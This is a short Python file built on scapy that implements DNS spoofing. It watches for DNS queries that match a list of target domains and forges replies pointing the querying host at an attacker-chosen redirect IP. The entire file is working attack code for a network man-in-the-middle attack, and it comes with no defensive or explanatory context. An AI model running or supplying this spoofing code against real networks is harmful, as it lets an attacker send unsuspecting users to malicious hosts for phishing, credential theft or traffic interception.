import packet_sniffer
from scapy.all import *

class DnsSpoofArgs:
    def __init__(self, urls, redirect_ip):
        self.urls = urls
        self.redirect_ip = redirect_ip

def check_packet(pkt, args: DnsSpoofArgs):
    if DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0 and pkt.haslayer("DNS Question Record"):
        print("[*] Checking DNS record: {} from ip {} to {}".format(pkt["DNS Question Record"].qname, pkt[IP].src, pkt[IP].dst))
        for url in args.urls:
            if url in str(pkt["DNS Question Record"].qname):
                print("[+] DNS Spoofing: {}".format(pkt["DNS Question Record"].qname))
                spf_resp =  Ether()/IP(dst=pkt[IP].src, src=pkt[IP].dst)/UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/DNS(id=pkt[DNS].id,ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname, rdata=args.redirect_ip)/DNSRR(rrname=pkt[DNSQR].qname,rdata=args.redirect_ip))

                return spf_resp

    return pkt
